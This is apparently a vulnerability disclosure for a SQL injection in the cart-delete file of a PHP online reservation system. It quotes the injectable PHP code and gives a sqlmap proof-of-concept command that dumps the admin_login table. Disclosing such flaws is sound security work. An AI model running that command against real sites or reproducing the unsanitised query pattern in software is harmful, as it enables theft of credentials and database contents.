# SQL Injection Vulnerability in delete.php (Cart Delete)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Vulnerable File**: app/checkout/delete.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the shopping cart delete functionality. The application directly concatenates POST parameter into SQL DELETE query without validation, allowing attackers to extract database data and manipulate cart contents.

### Analyse

**Vulnerability: SQL Injection in DELETE Query**

```php
<?php include('../../config/config.php'); ?>
<?php
// Line 4: User input from POST without validation
$id = $_POST['id'];

// Line 5: VULNERABLE! Direct concatenation into DELETE query
mysql_query("DELETE FROM cart WHERE prod_id = '$id'") or die(mysql_error());
?>
```

**Vulnerability Analysis**:

1. **DELETE Query Injection**: `id` parameter directly concatenated into SQL DELETE (line 5)
2. **No Input Validation**: POST parameter not validated before use
3. **No Prepared Statements**: Uses deprecated `mysql_query()` function
4. **Error Disclosure**: MySQL errors directly displayed to user
5. **Data Manipulation**: Allows deletion of arbitrary cart items
6. **Data Extraction**: SQL injection can be used to extract sensitive database data

### POC

```bash
sqlmap -u "http://localhost:8081/app/checkout/delete.php" \
  --data="id=1" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
